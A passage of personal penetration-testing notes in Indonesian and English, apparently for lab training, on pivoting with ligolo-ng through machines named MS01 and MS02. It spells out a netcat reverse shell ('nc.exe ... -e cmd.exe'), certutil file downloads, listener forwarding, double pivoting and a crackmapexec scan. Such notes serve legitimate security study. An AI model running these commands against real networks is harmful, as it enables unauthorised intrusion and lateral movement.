>> Done, SPECIALNYA LIGOLO, GK PERLU PROXYCHAINS LAGI

6) Check connection
```cmd
crackmapexec smb 10.10.120.0/24
```





# Ligolo-ng - RECEIVING A REVERSE SHELL
>> Lanjut dari sebelumnya
>> Sama kyk chisel, forward traffic revshell dari MS02 ke kali kita via MS01.

1) On Kali Linux Ligolo, Setup forwarding with ligolo
```cmd
Pergi ke session 1

[Agent name for MS01] >> listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444 
```
>> SEGALA TRAFFIC yang pergi ke MS01 di port 1234 akan diforward ke Kali Linux port 4444.

```cmd
[Agent name for MS01] >> listener_list
```
>> View listener yang udah disetnya


2) On Kali, setup reverse shell
```cmd
nc -lnvp 4444
```

3) On MS02
```cmd
nc.exe <ms01_ip> 1234 -e cmd.exe
```

# Kalo mw transfer file, sama aja.

1) On Kali, setup ligolo forward to our python web server on port 80
```cmd
[Agent name for MS01] >> listener_add --addr 0.0.0.0:7777 --to 127.0.0.1:80 
```
2) On kali open a python3 web server
```cmd
python3 -m http.server 80
```
3) On MS01, Download filenya ke ms01 port 7777
```cmd
certutil -urlcache -f http://<ms01_ip>:7777/winpeas64.exe winpeas.exe
```

# Ligolo-ng, Double Pivoting
https://systemweakness.com/double-pivoting-for-newbies-with-ligolo-ng-4177b3f1f27b

1) Transfer ligolo agent ke mesin MS02
2) Di Kali linux, Ligolo-ng, session 1
```cmd
[Agent name for MS01] >> listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
[Agent name for MS01] >> listener_list
```
3) Tinggal jalanin agent di MS02 ke IP MS01 port 11601
```cmd
agent.exe -connect <MS01_ip>:11601 -ignore-cert
```
4) Di Kali Linux, akan ada session baru yg connect
```cmd
[Agent name for MS01] >> session
Pilih 2, itu yg baru connect
[Agent name for MS01] >> start
```
>> Kelar, straight-forward. Tinggal bikin IP route kyk sebelumnya.
5) Forward IP
```cmd
ip route add 192.168.43.0/24 dev ligolo
ip route list
```

6) Boom kita bisa akses kaki kedua
```cmd
ping 192.168.43.128
```

# Triple pivot sama aja.












